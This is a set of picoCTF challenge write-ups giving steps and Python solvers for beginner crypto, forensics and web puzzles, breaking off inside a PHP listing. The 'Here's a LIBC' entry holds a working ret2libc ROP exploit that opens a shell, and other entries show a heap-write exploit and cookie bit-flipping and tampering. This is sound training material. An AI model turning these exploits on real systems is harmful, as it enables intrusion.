3. https://developers.google.com/search/docs/advanced/robots/create-robots-txt?hl=zh-tw
4. https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Scavenger%20Hunt/Scavenger%20Hunt.md






## MacroHard WeakEdge
![](https://i.imgur.com/KJRxj1j.png)

### Hints 
None

### Solution by steps
1. `wget https://mercury.picoctf.net/static/c00c449c3b08daaccacca6f9d5c55d49/Forensics%20is%20fun.pptm`
2. If there is a file hidden in one file use binwalk.Run ` binwalk 'Forensics is fun.pptm'`and you will see a whole bunch of zipped file
3. Then run `binwalk -e 'Forensics is fun.pptm'` to extract the file
4. The last line of the output `ppt/slideMasters/hidden` seems interesting
5. So run`cd '_Forensics is fun.pptm.extracted'` and`cd ppt/slideMasters`
6. After doing so,`at hidden` and a whole bunch of letters came out
7. Copy them and run
```python
~$ python

>>> s = "THE_RESULT_YOU_JUST_COPIED"
>>> s = s.split(" ")
>>> print("".join(s))
THE_RESULT_WITHOUT_BLANKS
``` 
8. Copy it and throw to the [online base64 decoder](https://www.base64decode.org/) and you will get the flag after decoding it.

### Useful Stuffs
1. https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/MacroHard%20WeakEdge/MacroHard%20WeakEdge.md
2. https://www.base64decode.org/
3. https://kknews.cc/zh-tw/code/x26v5o8.html



## New Caesar
![](https://i.imgur.com/nr55azs.png)

### Hints
1. How does the cipher work if the alphabet isn't 26 letters?
2. Even though the letters are split up, the same paradigms still apply

### Solution by steps
1. `wget https://mercury.picoctf.net/static/d8a6722e08659449dd091668c0c9bbca/new_caesar.py`
2. `cat new_caesar.py` and you will get this
```python
import string

LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16]

def b16_encode(plain):
        enc = ""
        for c in plain:
                binary = "{0:08b}".format(ord(c))
                enc += ALPHABET[int(binary[:4], 2)]
                enc += ALPHABET[int(binary[4:], 2)]
        return enc

def shift(c, k):
        t1 = ord(c) - LOWERCASE_OFFSET
        t2 = ord(k) - LOWERCASE_OFFSET
        return ALPHABET[(t1 + t2) % len(ALPHABET)]

flag = "redacted"
key = "redacted"
assert all([k in ALPHABET for k in key])
assert len(key) == 1

b16 = b16_encode(flag)
enc = ""
for i, c in enumerate(b16):
        enc += shift(c, key[i % len(key)])
print(enc)
```
3. After knowing hoe it works, `vim solve.py` and write down
```python
import string

LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16]

encrypted_flag = "kjlijdliljhdjdhfkfkhhjkkhhkihlhnhghekfhmhjhkhfhekfkkkjkghghjhlhghmhhhfkikfkfhm"

def b16_decode(plain):
    dec = ""

    for i in range(0, len(plain), 2):
        i1 = ALPHABET.index(plain[i])
        i2 = ALPHABET.index(plain[i+1])
        b1 = bin(i1)[2:].zfill(4)
        b2 = bin(i2)[2:].zfill(4)
        b = b1 + b2
        d = int(b, 2)
    
        dec += chr(d)
    return dec

def unshift(c, k):
    t1 = ord(c) - LOWERCASE_OFFSET
    t2 = ord(k) - LOWERCASE_OFFSET
    return ALPHABET[(t1 - t2) % 16]

for key in ALPHABET:
    dec = ""
    for i, c in enumerate(encrypted_flag):
        dec += unshift(c, key)
    print(b16_decode(dec))
```
4. `python solve.py` and get the one seems more likely to be the key `et_tu?_23217b54456fb10e908b5e87c6e89156`

### Useful Stuffs
1. https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/new-caesar
2. https://www.jcchouinard.com/create-python-script-from-terminal/

## ARMssembly 1
![](https://i.imgur.com/V94wKxd.png)

### Hints
1. Shifts

### Solution by steps
1. `wget https://mercury.picoctf.net/static/7cc2b73e671f61f8dc2d40493fb62611/chall_1.S`
2. `cat chall_1.S` and after reading it you'll get to know that the flag is (THE_1^st^_RED_NUMBER<< THE_2^nd^_RED_NUMBER)//THE_3^rd^_RED_NUMBER 

### Useful Stuffs
1. https://www.youtube.com/watch?v=ATqDoib3Z9Y&ab_channel=MartinCarlisle

## Cache Me  (SUPER HARD)
![](https://i.imgur.com/FCuyXns.png)

### Hints
1. It may be helpful to read a little bit on GLIBC's tcache.

### Solution by steps
1. `wget https://mercury.picoctf.net/static/8e71d30964dc6344e76c961d02772d34/heapedit`
2. `wget https://mercury.picoctf.net/static/8e71d30964dc6344e76c961d02772d34/Makefile`
3. `wget https://mercury.picoctf.net/static/8e71d30964dc6344e76c961d02772d34/libc.so.6`
4. `vim solve.py`and paste these codes
```python!
from pwn import *

r = remote("mercury.picoctf.net", 17612)

r.sendlineafter("Address:", "-5144")
r.sendlineafter("Value:", b'\x08')

print(r.recvall())
```
5. `python solve.py` and you'll get the flag at the last line output


### Useful Stuffs
1. https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/pwn/cache_me_outside





## Some Assembly Required 1
![](https://i.imgur.com/exPMUb2.png)

### Hints
None

### Solution by steps
1. Press the website link and press 'Ctrl + U'
![](https://i.imgur.com/JnIlTH9.png)
```htmlembedded
<html>
<head>
	<meta charset="UTF-8">
	<script src="G82XCw5CX3.js"></script>
</head>
<body>
	<h4>Enter flag:</h4>
	<input type="text" id="input"/>
	<button onclick="onButtonPress()">Submit</button>
	<p id="result"></p>
</body>
</html>
```
2. Press 'G82XCw5CX3.js' and it will take you to here
```htmlembedded!
const _0x402c=['value','2wfTpTR','instantiate','275341bEPcme','innerHTML','1195047NznhZg','1qfevql','input','1699808QuoWhA','Correct!','check_flag','Incorrect!','./JIFxzHyW8W','23SMpAuA','802698XOMSrr','charCodeAt','474547vVoGDO','getElementById','instance','copy_char','43591XxcWUl','504454llVtzW','arrayBuffer','2NIQmVj','result'];const _0x4e0e=function(_0x553839,_0x53c021){_0x553839=_0x553839-0x1d6;let _0x402c6f=_0x402c[_0x553839];return _0x402c6f;};(function(_0x76dd13,_0x3dfcae){const _0x371ac6=_0x4e0e;while(!![]){try{const _0x478583=-parseInt(_0x371ac6(0x1eb))+parseInt(_0x371ac6(0x1ed))+-parseInt(_0x371ac6(0x1db))*-parseInt(_0x371ac6(0x1d9))+-parseInt(_0x371ac6(0x1e2))*-parseInt(_0x371ac6(0x1e3))+-parseInt(_0x371ac6(0x1de))*parseInt(_0x371ac6(0x1e0))+parseInt(_0x371ac6(0x1d8))*parseInt(_0x371ac6(0x1ea))+-parseInt(_0x371ac6(0x1e5));if(_0x478583===_0x3dfcae)break;else _0x76dd13['push'](_0x76dd13['shift']());}catch(_0x41d31a){_0x76dd13['push'](_0x76dd13['shift']());}}}(_0x402c,0x994c3));let exports;(async()=>{const _0x48c3be=_0x4e0e;let _0x5f0229=await fetch(_0x48c3be(0x1e9)),_0x1d99e9=await WebAssembly[_0x48c3be(0x1df)](await _0x5f0229[_0x48c3be(0x1da)]()),_0x1f8628=_0x1d99e9[_0x48c3be(0x1d6)];exports=_0x1f8628['exports'];})();function onButtonPress(){const _0xa80748=_0x4e0e;let _0x3761f8=document['getElementById'](_0xa80748(0x1e4))[_0xa80748(0x1dd)];for(let _0x16c626=0x0;_0x16c626<_0x3761f8['length'];_0x16c626++){exports[_0xa80748(0x1d7)](_0x3761f8[_0xa80748(0x1ec)](_0x16c626),_0x16c626);}exports['copy_char'](0x0,_0x3761f8['length']),exports[_0xa80748(0x1e7)]()==0x1?document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)]=_0xa80748(0x1e6):document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)]=_0xa80748(0x1e8);}
```
3. Find the string which begins with './' in const _0x402c
4. Copy the string without './' and replace the js file to it in the URL
5. After hitting Enter, you'll get your flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=aRLA1PQzNXI&ab_channel=MartinCarlisle


## Mini RSA
![](https://i.imgur.com/z2EVaJs.png)

### Hints
1. RSA [tutorial](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
2. How could having too small of an e affect the security of this key?
3. Make sure you don't lose precision, the numbers are pretty big (besides the e value)
4. You shouldn't have to make too many guesses
5. pico is in the flag, but not at the beginning

### Solution by steps
1. `wget https://mercury.picoctf.net/static/81689952b7442c3e23a9f703198c0a4c/ciphertext`
2. Look up [RSA in wikipedia](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
3. `vim solve.py` and write down
```python=
import gmpy2


n = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e = 3

c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106

for i in range(10000):
    m, is_true_root = gmpy2.iroot(i*n + c, e)
    if is_true_root:
        print(f"Found i = {i}")
        print("Message: {}".format(bytearray.fromhex(format(m, 'x')).decode()))
        break
```
4. Then run `python solve.py` to get your flag

### Useful Stuffs
1. https://en.wikipedia.org/wiki/RSA_(cryptosystem)
2. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Mini_RSA.md
3. https://pypi.org/project/gmpy2/


## Dachshund Attacks
![](https://i.imgur.com/DjIkZyS.png)

### Hints
1. What do you think about my pet? dachshund.jpg

### Solution by steps
1. `nc mercury.picoctf.net 37455` and copy the e,n and c text
2. And paste them to [RSA-CIPHER](https://www.dcode.fr/rsa-cipher)
3. After hitting enter, you'll get your flag

### Useful Stuffs
1. https://www.dcode.fr/rsa-cipher

## Trivial Flag Transfer Protocol
![](https://i.imgur.com/NbFOucA.png)

### Hints
1. What are some other ways to hide data?

### Solution by steps
1. Download the .pcapng file and open it by WireShark
2. Click File >>> Extract Object >>> TFTP and click 'Save all button'
![](https://i.imgur.com/HGxU7Xw.png)

3. Upload those files to Github
4. `wget https://raw.githubusercontent.com/YOUR_USER_NAME/YOUR_REPOSITORIES_NAME/main/FILE_YOU_JUST_UPLOAD`
5. Run `ls` to check whether those files are exists in your webshell
6. [Open 'program.deb' by 7-zip](https://template.city/deb/) and after a few click you might figure out that these files related to ['Steghide'](http://steghide.sourceforge.net/)
7. Next `cat instructions.txt` and it returns `GSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNA` as output.
8. Use [ROT-13 decoder](https://rot13.com/) to decode things above to get `TFTPDOESNTENCRYPTOURTRAFFICSOWEMUSTDISGUISEOURFLAGTRANSFER.FIGUREOUTAWAYTOHIDETHEFLAGANDIWILLCHECKBACKFORTHEPLAN`
9. `cat plan` and get `VHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBF`.
10. Decode it as the same way just did and get `IUSEDTHEPROGRAMANDHIDITWITH-DUEDILIGENCE.CHECKOUTTHEPHOTOS`
11. After doing so, read ['Steghide'](http://steghide.sourceforge.net/) to know how to use it.
12. Run `steghide extract -sf ./BMP_FILENAME_YOU_WANT_TO_READ -p DUEDILIGENCE`
13. After running `steghide extract -sf ./picture3.bmp -p DUEDILIGENCE`, you'll get a flag.txt
14. `cat flag.txt` to get your flag


### Useful Stuffs
1. https://unix.stackexchange.com/questions/228412/how-to-wget-a-github-file
2. https://stackoverflow.com/questions/8779197/how-to-link-files-directly-from-github-raw-github-com
3. https://systemweakness.com/steghide-a-beginners-tutorial-35ec0ea90446
4. https://medium.com/@quackquackquack/picoctf-trivial-flag-transfer-protocol-writeup-20c5d2d0dfdf

## More Cookies
![](https://i.imgur.com/3pCJb57.png)

### Hints
1. https://en.wikipedia.org/wiki/Homomorphic_encryption
2. The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name

### Solution by steps
1. Press the link and you'll probably see this
![](https://i.imgur.com/g3QNWOu.png)
2. Right click and click 'Inspect(檢查)'.
3. Now, in the right of your window must have popped out a DevTools window.
4. ClickNetwork on the top bar and click Reset in right-top side of the original webpage.
5. Now you must see this on your window...
![](https://i.imgur.com/jGhopxd.png)
6. Copy the auth_name and try to decode it by [BASE64_DECODER](https://www.base64decode.org/).
7. Because it seems not giving the flag, it time to Bruteforce
8. Run `vim solve.py` and write down these
```python=
import requests
from base64 import b64decode, b64encode
from tqdm import tqdm

# Bit flip code based on https://crypto.stackexchange.com/a/66086.
# we need to decode from base64 twice because the cookie was encoded twice.
def bit_flip(pos, bit, data):
    raw = b64decode(b64decode(data).decode())

    list1 = bytearray(raw)
    list1[pos] = list1[pos] ^ bit
    raw = bytes(list1)
    return b64encode(b64encode(raw)).decode()

cookie = "THE_AUTH_NAME_YOU_JUST_COPIED"

for position_idx in tqdm(range(10), desc="Bruteforcing Position"):
    # The 96 really should be 128 to test every bit, but 96 worked for me.
    for bit_idx in tqdm(range(96), desc="Bruteforcing Bit"):
        auth_cookie = bit_flip(position_idx, bit_idx, cookie)
        cookies = {'auth_name': auth_cookie}
        r = requests.get('http://mercury.picoctf.net:THE_PORT_NUMBER_YOU_SHOULD_USE/', cookies=cookies)
        if "picoCTF{" in r.text:
            # The flag is between `<code>` and `</code>`
            print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
            break
```
9. Run `:wq` to quit and `python solve.py`to get your flag

### Useful Stuffs
1. https://github.com/HHousen/PicoCTF-2021/tree/master/Web%20Exploitation/More%20Cookies
2. https://pypi.org/project/tqdm/
3. https://www.796t.com/content/1545653947.html
4. https://blog.amis.com/%E5%90%8C%E6%85%8B%E5%8A%A0%E5%AF%86-part-1-%E7%B0%A1%E4%BB%8B-c46281304fd7

## ARMssembly 2
![](https://i.imgur.com/FoHlJNE.png)

### Hints
1. Loops

### Solution by steps
1. `wget https://mercury.picoctf.net/static/44f2f0e6f503fc6aac95e45390275e09/chall_2.S`
2. `cat chall_2.S` and after reading it, you'll find out the flag is the last 8 digits of the (VALUE_THE_QUESTION_GAVE(in Decimal) * 3) and convert it to Heximal. 

### Useful Stuffs
1. https://www.youtube.com/watch?v=JNP_CtLpGTU&ab_channel=MartinCarlisle

## No Padding, No Problem
![](https://i.imgur.com/cqUcGEn.png)

### Hints
1. What can you do with a different pair of ciphertext and plaintext? What if it is not so different after all...

### Solution by steps
1. `nc mercury.picoctf.net 10333` and you will get n, e and ciphertext value
2. Paste ciphertext to decrypt but it returned `Will not decrypt the ciphertext. Try Again`
3. Paste them to [RSA cipher](https://www.dcode.fr/rsa-cipher) and it fails
4. But we know that decrypted == c^d mod(n) == (c+n)^d mod(n)
5. So try to input the n + ciphertext value and get a whole bunch of numbers.
6. Find a online python interpreter and run 
```python=
print("THE_NUMBER_YOU_JUST_COPIED".replace(',',''))
```
*Don't forget to copy the output*
7. Run `vim solve.py` and paste these codes 
```python=
from Crypto.Util.number import long_to_bytes
text = long_to_bytes(THE_NUMBER_YOU_JUST_COPIED)

print("Plain text: ", text)
```
8. `python solve.py` and get your flag ~

### Useful Stuffs
1. https://ctftime.org/writeup/32010
2. https://www.calculator.net/big-number-calculator.html

## Here's a LIBC (SUPER DUPER SUPER DUPER HARD)
![](https://i.imgur.com/D9SyqUX.png)

### Hints 
1. PWNTools has a lot of useful features for getting offsets.

### Solution by steps
1. `wget https://mercury.picoctf.net/static/3fb4dc8079eb7dcf84f26a3bca025815/vuln`
2. `wget https://mercury.picoctf.net/static/3fb4dc8079eb7dcf84f26a3bca025815/libc.so.6`
3. `wget https://mercury.picoctf.net/static/3fb4dc8079eb7dcf84f26a3bca025815/Makefile`
4. After running `nc mercury.picoctf.net 42072` and giving some texts as testing, you'll find out that it outputs things you just input in Capital & Lower case.
5. Look up the codes through [Ghidra](https://ghidra-sre.org/) to find out that the buffer is 112 bytes.
6. `pip install ROPgadget` and run `ROPgadget --help` to know how to use it
7. Run`ROPgadget --binary vuln | grep "pop rdi"` to get the address of the gadget *pop rdi ; ret*
8. Run`ROPgadget --binary vuln | grep "pop rsi"` to get the address of the gadget *pop rsi ; ret*
9. Run`ROPgadget --binary libc.so.6 | grep "pop rdx"` to get the address of the gadget *pop rdi ; ret*
10. `vim solve.py` and type in these codes
```python=
#!/bin/python3
from pwn import *
HOST = 'mercury.picoctf.net'
PORT = YOUR_PORT_NUMBER
EXE  = './vuln'
if args.EXPLOIT:
    r = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
exe = ELF(EXE)
pop_rdi = 0x400913
pop_rsi = 0x023e8a
pop_rdx = 0x001b96
offset  = libc.symbols['puts']
r.recvuntil(b'sErVeR!\n')
payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])
r.sendline(payload)
r.recvline()
leak = r.recv(6)+b'\x00\x00'
leak = u64(leak)
libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh\x00'))
system       = libc.symbols['system']
nullptr      = next(libc.search(b'\x00'*8))
execve       = libc.symbols['execve']
payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address + pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address + pop_rdx)
payload += p64(nullptr)
payload += p64(execve)
r.sendline(payload)
r.interactive()
```
11. Run `python solve.py`, type `ls` beside the red dollar sign and you might see the 'flag.txt'
12. `cat flag.txt` to get your flag

### Useful Stuffs
1. https://cyb3rwhitesnake.medium.com/picoctf-heres-a-libc-pwn-4184a99586d9


## where are the robots
![](https://i.imgur.com/BY4qRhO.png)

### Hints
1. What part of the website could tell you where the creator doesn't want you to look?

### Solutions by steps
1. Press the link and you'll see this
![](https://i.imgur.com/SGVj9Aw.png)

2. Add `robots.txt` behind the URL
```htmlembedded=
User-agent: *
Disallow: /8028f.html
```
3. Add `8028f.html` behind the URL
![](https://i.imgur.com/LYX9MqG.png)

### Useful Stuffs
1. https://en.wikipedia.org/wiki/URL


## vault-door-1
![](https://i.imgur.com/JJ1cNt4.png)

### Hints
1. Look up the charAt() method online.

### Solution by steps
1. Download the file and open with a code editor, you'll probably see this
```java=
import java.util.*;

class VaultDoor1 {
    public static void main(String args[]) {
        VaultDoor1 vaultDoor = new VaultDoor1();
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter vault password: ");
	String userInput = scanner.next();
	String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println("Access granted.");
	} else {
	    System.out.println("Access denied!");
	}
    }

    // I came up with a more secure way to check the password without putting
    // the password itself in the source code. I think this is going to be
    // UNHACKABLE!! I hope Dr. Evil agrees...
    //
    // -Minion #8728
    public boolean checkPassword(String password) {
        return password.length() == 32 &&
               password.charAt(0)  == 'd' &&
               password.charAt(29) == '9' &&
               password.charAt(4)  == 'r' &&
               password.charAt(2)  == '5' &&
               password.charAt(23) == 'r' &&
               password.charAt(3)  == 'c' &&
               password.charAt(17) == '4' &&
               password.charAt(1)  == '3' &&
               password.charAt(7)  == 'b' &&
               password.charAt(10) == '_' &&
               password.charAt(5)  == '4' &&
               password.charAt(9)  == '3' &&
               password.charAt(11) == 't' &&
               password.charAt(15) == 'c' &&
               password.charAt(8)  == 'l' &&
               password.charAt(12) == 'H' &&
               password.charAt(20) == 'c' &&
               password.charAt(14) == '_' &&
               password.charAt(6)  == 'm' &&
               password.charAt(24) == '5' &&
               password.charAt(18) == 'r' &&
               password.charAt(13) == '3' &&
               password.charAt(19) == '4' &&
               password.charAt(21) == 'T' &&
               password.charAt(16) == 'H' &&
               password.charAt(27) == '5' &&
               password.charAt(30) == '2' &&
               password.charAt(25) == '_' &&
               password.charAt(22) == '3' &&
               password.charAt(28) == '0' &&
               password.charAt(26) == '7' &&
               password.charAt(31) == 'e';
    }
}
```
2. Rearrange those character as it said to get the flag

### Useful Stuffs
1. https://www.runoob.com/java/java-string-charat.html


## whats a net cat ?
![](https://i.imgur.com/teUbTjQ.png)

### Hints
1. nc [tutorial](https://linux.die.net/man/1/nc)

### Solution by steps
1. `nc jupiter.challenges.picoctf.org 25103`

### Useful Stuffs
1. https://blog.gtwang.org/linux/linux-utility-netcat-examples/


## strings it
![](https://i.imgur.com/NQpfUc0.png)

### Hints
1. [strings](https://linux.die.net/man/1/strings)

### Solution by steps
1. `strings strings | grep picoCTF`

### Useful Stuffs
1. https://linux.die.net/man/1/strings
2. https://blog.gtwang.org/linux/linux-grep-command-tutorial-examples/


## Easy1
![](https://i.imgur.com/yLzHTGq.png)

### Hints
1. Submit your answer in our flag format. For example, if your answer was 'hello', you would submit 'picoCTF{HELLO}' as the flag.
2. Please use all caps for the message.

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/1fd21547c154c678d2dab145c29f1d79/table.txt`
2. `cat table.txt`
```python=
    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 
   +----------------------------------------------------
A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B
D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D
F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E
G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F
H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G
I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H
J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I
K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J
L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K
M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L
N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N
P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O
Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P
R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q
S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R
T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S
U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T
V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U
W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V
X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W
Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X
Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y
```
3. Find out the way how the flag was encrypted.
4. `vim solve.py` and write down this
```python=
from string import ascii_uppercase as letters

key = "SOLVECRYPTO"
encryptedFlag = "UFJKXQZQUNB"

alphabet = []
for i in letters:
    alphabet.append(i)

solvedFlag = []

for v, k in zip(encryptedFlag, key):
    sol = alphabet[alphabet.index(v) - alphabet.index(k)]
    solvedFlag.append(sol)

print("picoCTF{" + ''.join(solvedFlag) + "}")
```
5. `python solve.py` and get your flag ~


### Useful Stuffs
1. https://www.viceintelpro.com/easy1


## logon
![](https://i.imgur.com/9nlak4b.png)

### Hints
1. Hmm it doesn't seem to check anyone's password, except for Joe's?

### Solution by steps
1. Click the link to get to see this page
![](https://i.imgur.com/cDhjhR7.png)
2. Test 'WHATEVER_YOU_LIKE' in password and username blank
3. Find out that it doesn't give you the flag.
![](https://i.imgur.com/8InstPB.png)

4. Install [EditThisCookie in Chrome](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=zh-TW)
5. Press the button and edit the value of admin to true
![](https://i.imgur.com/qxGKkVL.png)
6. After that refresh your page and you'll get your flag.
![](https://i.imgur.com/w5oBpfg.png)

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10253596
2. https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=zh-TW


## 13
![](https://i.imgur.com/lveDUy6.png)

### Hints
1. This can be solved online if you don't want to do it by hand!

### Solution by steps
1. Paste the encrypted fla to [ROT13 Decoder](https://rot13.com/) and you'll get the flag

### Useful Stuffs
1. https://rot13.com/


## caesar
![](https://i.imgur.com/qbdA5nq.png)

### Hints
1. caesar cipher [tutorial](https://privacycanada.net/classical-encryption/caesar-cipher/)

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/49f31c8f17817dc2d367428c9e5ab0bc/ciphertext`
2. `cat ciphertext` to get `picoCTF{ynkooejcpdanqxeykjrbdofgkq}`
3. Next paste the result you just got to [online caesar-cipher calculator](https://cryptii.com/pipes/caesar-cipher) and add the shift number in the middle until the plainttext seems correct (like this `crossingtherubiconvfhsjkou`)
4. Don't forget to wrap the flag with `picoCTF{THE_FLAG_YOU_JUST_GOT}`


### Useful Stuffs
1. https://cryptii.com/pipes/caesar-cipher
2. https://ctf.samsongama.com/ctf/crypto/picoctf19-caesar.html


## dont-use-client-side
![](https://i.imgur.com/3GeWQkl.png)

### Hints
1. Never trust the client

### Solution by steps
1. Press the link and this page will pops out
![](https://i.imgur.com/KzlH2kg.png)
2. Press 'Ctrl + U' and you'll get this
```htmlembedded=

<html>
<head>
<title>Secure Login Portal</title>
</head>
<body bgcolor=blue>
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '723c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_7') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'e}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:yellow">
<div style="text-align:center">
<p>This is the secure login portal</p>
<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>
```
3. And you'll get your key after following the javascript instructions

### Useful Stuffs
None

## Bases
![](https://i.imgur.com/T1KM2Wr.png)

### Hints
1. Submit your answer in our flag format. For example, if your answer was 'hello', you would submit 'picoCTF{hello}' as the flag.

### Solution by steps
1. Copy the red words in the question and paste them to [Base64 Decoder](https://www.base64decode.org/)
2. Don't forget to wrap the result with `picoCTF{YOUR_RESULT}`

### Useful Stuffs
1. https://www.base64decode.org/


## First Grep
![](https://i.imgur.com/VESXV4k.png)

### Hints
1. grep [tutorial](https://ryanstutorials.net/linuxtutorial/grep.php)

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/315d3325dc668ab7f1af9194f2de7e7a/file`
2. `strings file | grep "pico"` and here comes the flag ~

### Useful Stuffs
1. https://ryanstutorials.net/linuxtutorial/grep.php
2. https://linux.die.net/man/1/strings


## Pixelated
![](https://i.imgur.com/dDsGo0D.png)

### Hints
1. https://en.wikipedia.org/wiki/Visual_cryptography
2. Think of different ways you can "stack" images

### Solution by steps
1. Download the two pictures
2. It looks like this...
![](https://i.imgur.com/vRlAqLE.png)
![](https://i.imgur.com/n0CDrAH.png)
3. Open VScode and run the python file with these codes
```python=
import numpy as np
from PIL import Image

# Open images
im1 = Image.open("scrambled1.png")
im2 = Image.open("scrambled2.png")

# Make into Numpy arrays
im1np = np.array(im1)
im2np = np.array(im2)

# Add images
result = im2np + im1np
# Convert back to PIL image and save
Image.fromarray(result).save('result.png')
```
4. Open the result.png to get your flag
![](https://i.imgur.com/zx6VVkN.png)


### Useful Stuffs
1. https://picoctf2021.haydenhousen.com/cryptography/pixelated
2. https://en.wikipedia.org/wiki/Visual_cryptography


## It is my Birthday
![](https://i.imgur.com/BKd1adD.png)

### Hints
1. Look at the category of this problem.
2. How may a PHP site check the rules in the description?

### Solution by steps
1. Press the link and this page will pops out
![](https://i.imgur.com/useVkTE.png)

2. Search 'MD5 collision' on Google and you will see [this](https://www.mscs.dal.ca/~selinger/md5collision/)
3. Download hello and erase files and add '.pdf' behind them
4. Upload them to the website and the php file will be popped up
```php=
<?php

if (isset($_POST["submit"])) {
    $type1 = $_FILES["file1"]["type"];
    $type2 = $_FILES["file2"]["type"];
    $size1 = $_FILES["file1"]["size"];
    $size2 = $_FILES["file2"]["size"];
    $SIZE_LIMIT = 18 * 1024;

    if (($size1 < $SIZE_LIMIT) && ($size2 < $SIZE_LIMIT)) {
        if (($type1 == "application/pdf") && ($type2 == "application/pdf")) {
            $contents1 = file_get_contents($_FILES["file1"]["tmp_name"]);
            $contents2 = file_get_contents($_FILES["file2"]["tmp_name"]);

            if ($contents1 != $contents2) {
